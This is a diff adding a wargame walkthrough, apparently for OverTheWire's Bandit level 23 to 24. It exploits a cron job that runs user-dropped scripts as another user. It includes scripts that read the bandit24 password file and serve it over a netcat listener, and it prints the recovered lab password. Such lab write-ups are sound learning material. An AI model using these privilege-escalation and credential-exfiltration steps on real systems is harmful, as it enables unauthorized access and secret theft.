@@ -764,6 +764,105 @@ information it prints.
 
 ## Level 23 -> 24
 
+A program is running automatically at regular intervals from cron, the time-based job scheduler.  
+Look in `/etc/cron.d/` for the configuration and see what command is being executed.  
+
+NOTE: This level requires you to create your own first shell-script. This is a 
+very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you 
+may want to keep a copy around... 
+
+---
+
+```bash
+ls -alh /etc/cron.d/cronjob_bandit24
+# -rw-r--r-- 1 root root 120 Oct 14 09:26 /etc/cron.d/cronjob_bandit24
+cat /etc/cron.d/cronjob_bandit24
+# @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+# * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+ls -alh /usr/bin/cronjob_bandit24.sh
+# -rwxr-x--- 1 bandit24 bandit23 384 Oct 14 09:26 /usr/bin/cronjob_bandit24.sh
+vi /usr/bin/cronjob_bandit24.sh
+```
+
+Script contents (comments were added by me):
+```bash
+#!/bin/bash
+
+myname=$(whoami) # bandit24
+
+cd /var/spool/$myname/foo # /var/spool/bandit24/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*; # loop over all files in the directory
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)" # shows the owner of all files, saves to $owner
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+This is running all scripts in the `/var/spool/bandit24/foo` directory, then
+deletes the script file after it's run.  
+
+More exploring:
+```bash
+ls -Alh /var/spool/bandit24/
+# total 1.9M
+# drwxrwx-wx 8 root     bandit24 1.9M Jan 31 18:38 foo
+```
+
+We can add a script in the `foo/` directory.  
+```bash
+cd /var/spool/bandit24
+touch foo/test.sh
+chmod 777 foo/test.sh
+vi foo/test.sh
+```
+Now we have a script file in the same directory as all others.  
+
+```bash
+#!/bin/bash
+target_dest="/tmp/b24pass.txt"
+touch "$target_dest"
+chmod 777 "$target_dest"
+printf "Attempting to output contents of password file...\n" > "$target_dest"
+cat /etc/bandit_pass/bandit24 > "$target_dest"
+```
+
+This script should be run as the user bandit24 every minute, and should have
+access to the password file.  
+
+```bash
+tail -F /tmp/b24pass.txt
+```
+
+
+This seems to not be working for whatever reason.  
+The script file is deleted, however it does not create the /tmp/b24pass.txt file.  
+
+Idea: Serve using netcat.  
+```bash
+#!/bin/bash
+trap : SIGKILL # Trap signal 9 because it
+nc -lp 1234 < /etc/bandit_pass/bandit24 &
+```
+
+```bash
+printf '#!/bin/bash\ntrap : 9\nnc -lp 1234 < /etc/bandit_pass/bandit24 &\n' > ./foo/kol.sh && chmod 755 ./foo/kol.sh
+```
+
+Then try to connect to retrieve password using an `until` loop:
+```bash
+until nc localhost 1234; do sleep 0.1; done
+# gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
+
 <!-- ## Level 24 -> 25 -->
 
 <!-- ## Level 25 -> 26 -->
